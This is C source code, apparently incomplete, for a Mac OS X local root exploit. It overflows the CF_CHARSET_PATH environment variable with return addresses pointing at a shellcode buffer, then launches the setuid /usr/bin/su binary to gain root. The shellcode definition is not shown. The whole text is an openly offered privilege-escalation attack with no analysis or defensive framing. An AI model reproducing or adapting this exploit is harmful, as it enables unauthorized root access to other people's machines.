int main(void){
 unsigned int i=0;
 char *buf,*env[3];
 printf("(*)MacOS X[CF_CHARSET_PATH]: local root exploit.\n");
 printf("(*)by: [email protected], found by iDefense adv. (anon)\n\n");
 if(!(buf=(char *)malloc(1100+1)))exit(1);
 memcpy(buf,"CF_CHARSET_PATH=",16);
 printf("[*] setting up the environment.\n");
 for(i=16;i<1100;i+=4)*(long *)&buf[i]=(0xbffffffa-strlen(exec));
 env[0]=buf;
 env[1]=exec;
 env[2]=NULL;
 printf("[*] executing su... (press ENTER at the \"Password: \""
 " prompt)\n\n");
 if(execle("/usr/bin/su","su",0,env))
  printf("[!] failed executing /usr/bin/su.\n");
 exit(0);
}